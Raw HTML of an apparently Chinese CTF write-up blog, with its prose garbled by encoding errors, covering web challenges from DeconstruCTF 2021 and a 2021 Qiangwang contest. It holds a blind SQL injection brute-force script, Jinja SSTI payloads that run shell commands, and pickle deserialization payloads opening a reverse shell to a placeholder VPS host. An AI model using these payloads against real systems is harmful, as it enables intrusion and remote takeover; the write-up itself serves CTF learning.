&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gate keeper&amp;#34;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;taxi union&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2052/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;TN-06-AP-9879&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;lisence_plate&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;location&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;gate keeper&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2082/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;The flag for the CTF is the password you entered.(If you havent cheated that is)&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;URL&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">domain&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; or &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200"> like &amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">%&amp;#39;; --&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">column&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webhungry-man">Web/Hungry Man&lt;/h2>
&lt;blockquote>
&lt;p>There is nothing here I promise! ;)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png" alt="image-20211004172041299">&lt;/p>
&lt;p>æŠ“åŒ…ï¼Œcookieéƒ¨åˆ†æœ‰ä¸€ä¸ªb64ï¼Œè§£ç åŽ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png" alt="image-20211004172123925">&lt;/p>
&lt;p>è¯´å®žè¯ï¼Œè¿™ä¸ªé¢˜åšçš„æ—¶å€™æ²¡æ³¨æ„set-cookieçš„éƒ¨åˆ†ï¼Œ&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>è¿™é‡Œçš„ä¾æ®set-cookieçš„å€¼è®¾ç½®åŽï¼Œä¼šä¸æ–­çš„äº§ç”Ÿæ–°çš„md5-hashçš„cookieå€¼ï¼Œå†™ä¸€ä¸ªè„šæœ¬ä¸æ–­åœ°è®¾ç½®å’Œåº”ç”¨æ–°çš„cookieï¼Œå°†è¿™äº›è§£å¯†åŽæ‹¼èµ·æ¥å°±æ˜¯flagäº†&lt;/p>
&lt;p>&lt;code>dsc{91v3_m3_4_h4ndfu1_0f_c00k135}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-2">Web/Curly Fries 2&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. Why do logos make things so recognizable?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png" alt="image-20211004172502484">&lt;/p>
&lt;p>æ— æç¤ºï¼Œ&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>æœ‰ç‚¹è„‘æ´žäº†ï¼ŒæŠŠUser-Agentçš„åœ°æ–¹è®¾ç½®ä¸ºxboxå’ŒLinuxä¹‹åŽï¼Œå›¾ç‰‡ä¼šæ¶ˆå¤±å¹¶éœ²å‡ºflag&lt;/p>
&lt;p>&lt;code>dsc{1m4g1n3_l1nux_0n_4n_xb0x}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-3">Web/Curly Fries 3&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. I&amp;rsquo;m with you, every step of the way.&lt;/p>
&lt;/blockquote>
&lt;p>ç›´æŽ¥è®¿é—®æç¤º405ï¼Œpostä¸€ä¸‹å›žæ˜¾&lt;em>perhaps try Googling me instead?&lt;/em>&lt;/p>
&lt;p>è®¿é—®/robots.txtï¼Œ404&lt;/p>
&lt;p>ç”¨wappalyzerå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨&lt;/p>
&lt;p>&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>çœ‹åˆ°ç¬¬ä¸€ä¸ªæç¤ºä¹‹åŽä¸å¤Ÿæ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æ¥æºreferæ˜¯google.com&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾ä¸­æç¤ºæˆ‘ä»¬å†è®¾ç½®Host&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H&amp;quot;Host:https://dscvit.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾&lt;em>potates and carrots are my friends, milk and Cookies will be my end&lt;/em>ï¼Œä¸æ˜¯å¾ˆæ˜Žæ˜¾ï¼Œä½†æ˜¯åº”è¯¥è®¾ç½®cookie=root&lt;/p>
&lt;p>ä¹‹åŽå›žæ˜¾&lt;em>JFATHER, JMOTHER, JDAUGHTER, ____?&lt;/em>ï¼Œæç¤ºæŠŠcontent-typeæ”¹ä¸ºjson&lt;/p>
&lt;p>å›žæ˜¾*{&amp;lsquo;error&amp;rsquo;: &amp;lsquo;json data missing&amp;rsquo;}*ï¼Œæ·»åŠ ä¸€ç‚¹data&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;foo&amp;quot;:&amp;quot;bar&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾*{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;required&amp;rsquo;}}&lt;em>ï¼Œå°†fooæ”¹ä¸ºbarï¼Œå›žæ˜¾&lt;/em>{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;which club am i at?'}}*&lt;/p>
&lt;p>*ä¸å¤ªæ‡‚ä¸ºå•¥è¿™å°±èƒ½çŸ¥é“æŠŠbarèµ‹å€¼ä¸ºPSGï¼Ÿï¼Ÿï¼Ÿ&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;messi&amp;quot;:&amp;quot;psg&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°flag &lt;code>dsc{th15_15_w4y_t00_much_w0rk}&lt;/code>&lt;/p>
&lt;h2 id="webmega-mailer">Web/Mega Mailer&lt;/h2>
&lt;blockquote>
&lt;p>We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png" alt="image-20211004005500420">&lt;/p>
&lt;p>è®²çœŸï¼Œä¹‹å‰æ²¡æŽ¥è§¦è¿‡&lt;/p>
&lt;p>é¦–å…ˆåœ¨è‡ªå·±çš„vpsä¸Šå¼€ä¸€ä¸ªsmtpçš„æœåŠ¡ï¼Œç”¨pythonå¼€&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽå…¶å®ƒä¿¡æ¯æ­£å¸¸å¡«ï¼Œbodyéƒ¨åˆ†å­˜åœ¨sstiæ³¨å…¥ï¼Œpayloadæ¥è‡ªäºŽ&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png" alt="image-20211004181339121">&lt;/p>
&lt;p>&lt;code>dsc{819_8r41n_m41L3R}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>è¯´å®žè¯ï¼Œè¿™ä¸€ç¯‡wpæ—©å°±æ°´å®Œäº†ï¼Œä½†æ˜¯ä¸­é—´é‚£ä¸ªNever gonna lie to youçš„é¢˜å› ä¸ºæ²¡æœ‰åœ°æ–¹å¤çŽ°ä¹Ÿæ²¡æœç€åˆ«çš„wpå°±ä¸€ç›´æ‹–ç€ï¼Œæ‹–åˆ°çŽ°åœ¨ï¼Œè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ”¾å¼ƒäº†ï¼Œå¯æƒœæ­»äº†ï¼Œè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬åšé¢˜å¤çŽ°è¦è¶æ—©&lt;/p></description></item><item><title>2021å¼ºç½‘æ‹Ÿæ€ Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
&lt;p>webæœ‰3ä¸ªéƒ½æ˜¯æœ‰äº†åŒ…æµ†çš„åŽŸé¢˜â€¦â€¦è¿˜æœ‰ä¸€ç‚¹è„‘æ´žé¢˜ï¼Œåæ­£å¥‡å¥‡æ€ªæ€ªçš„&lt;/p>
&lt;p>å±žäºŽæ˜¯è¢«å¸ˆå‚…ä»¬å¸¦é£žäº†ï¼Œæ‰€ä»¥è¯¦ç»†çš„wpè¿˜æ˜¯è‡ªå·±å†™ä¸€å†™ï¼Œè®¤çœŸåœ°å¤çŽ°ä¸€ä¸‹&lt;/p>
&lt;/blockquote>
&lt;h2 id="zerocalc">zerocalc&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024031549328.png" alt="image-20211024031549328">&lt;/p>
&lt;p>emmmmmm è¯´å®žè¯ä¸€å¼€å§‹æ²¡æœ‰å‡º å› ä¸ºæ²¡æ‚Ÿå‡ºæ¥å®ƒè¿™æ˜¯ä¸ªä»€ä¹ˆé€»è¾‘2333333&lt;/p>
&lt;h2 id="ezpickle">ezPickle&lt;/h2>
&lt;pre tabindex="0">&lt;code># ç”¨pker.pyç”Ÿæˆpayload
notadmin=GLOBAL('config','notadmin')
notadmin[&amp;quot;admin&amp;quot;]=&amp;quot;yes&amp;quot;
exec=GLOBAL('config','backdoor')
payload='''__import__('subprocess').call(\&amp;quot;echo -e '#!/bin/bash\\nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1'&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x\&amp;quot;,shell=True)'''
exec(payload)
return
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">subprocess&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">).call(&amp;#34;echo -e &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&amp;#34;,shell=True)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxx&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023215957693.png" alt="image-20211023215957693">&lt;/p>
&lt;p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒåŸºç¡€çš„pickleé¢˜ï¼Œæ˜¯2021å·…å³°æžå®¢what_pickleçš„é˜‰å‰²ç‰ˆï¼ˆæž„é€ çš„æ€è·¯å‡ ä¹Žä¸€æ · ä½†æ˜¯ç®€å•å¾ˆå¤šï¼‰ï¼Œå‡ ä¹Žä¸€æ ·çš„é¢˜ç›®è¿˜æœ‰ [SUCTF 2019]Guess Game&lt;/p>
&lt;p>é™åˆ¶çš„ç‚¹åœ¨äºŽ&lt;u>&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/#--%E4%BB%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%85%A5%E9%A2%98%E7%9B%AE%E4%B8%AD%E8%87%AA%E8%AE%BE%E7%9A%84%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%9D%97%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89__%E7%AC%A6">åªå…è®¸å¼•å…¥é¢˜ç›®è‡ªè®¾æ¨¡å—&amp;amp;é™åˆ¶æ¨¡å—ä¸­å«ä¸‹åˆ’çº¿&lt;/a>&lt;/u>ï¼Œé‚£å°±ç›´æŽ¥å˜é‡è¦†ç›–ï¼Œç„¶åŽåˆ©ç”¨ç»™å‡ºçš„&lt;code>eval()&lt;/code>å¼¹shellå°±å¥½äº†&lt;/p>
&lt;p>â€”â€”â€”â€”å¦å¤–è¿™é‡Œçš„payloadä¹Ÿå¯ä»¥æ˜¯ç®€çŸ­ç‰ˆæœ¬çš„å¼¹sehllçš„payload ä¸å”¯ä¸€å˜›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ç”±äºŽè¿™é‡Œçš„ååºåˆ—åŒ–å…¥å£æ˜¯getä¼ å‚ï¼Œæ‰€ä»¥é‡åˆ°+å·ä¼šå‡ºé—®é¢˜ï¼Œä¼ è¿›åŽ»ä¹‹å‰è¦å…ˆurlencode(encode all special chars)&lt;/p>
&lt;p>â€”â€”â€”â€”é¡ºå¸¦ç»ƒä¸ªæ‰‹ï¼Œæ“ä¸€ä¸ªä¸å«&lt;code>b'R'&lt;/code>çš„opcodeï¼ˆç”¨&lt;code>b'o'&lt;/code>ä»£æ›¿ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0(g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">o.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ å‚çš„æ—¶å€™è®°å¾—å†urlencodeä¸€ä¸‹~~~&lt;/p>
&lt;p>â€”â€”â€”â€”ä¹‹å‰æˆ‘çš„&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/">æ€»ç»“ç¬”è®°&lt;/a>å·²ç»ç›¸å½“å…¨é¢äº† &lt;del>å¯ä»¥å‡ºCTFæ•™ç§‘ä¹¦äº†233333&lt;/del>&lt;/p>
&lt;h2 id="jack-shiro">Jack-Shiro&lt;/h2>
&lt;p>å±žäºŽæ˜¯åŽŸé¢˜äº†å±žäºŽæ˜¯å±žäºŽæ˜¯å±žäºŽæ˜¯çƒ¤çƒ‚äº†å·²ç»ï¼Œå‚è§ &lt;a href="https://www.zhaoj.in/read-6859.html#WEB1_javaweb">[çº¢æ˜Žè°·CTF 2021] JavaWeb&lt;/a> | &lt;a href="https://www.huamang.xyz/index.php/archives/99/">[å¤©ç¿¼æ¯ 2021] jackson&lt;/a> | &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">[NPUCTF2020] EzShiro&lt;/a> &lt;del>ï¼ˆè™½ç„¶æˆ‘è‡ªå·±æ ¹æœ¬æ²¡å‘çŽ° å®žåœ¨æ˜¯åšè¿‡çš„é¢˜å¤ªå°‘äº† javaæ›´æ˜¯ä¸ä¼š æˆ‘çš„&lt;/del>&lt;/p>
&lt;p>/loginä¸‹æœ‰ä¸ªç™»å½•ï¼Œå›žæ˜¾/jsonï¼Œè¿”å›žçš„cookieæœ‰ä¸ªrememberMe=deleteMeï¼Œå¯ä»¥çŸ¥é“æ˜¯shiro&lt;/p>
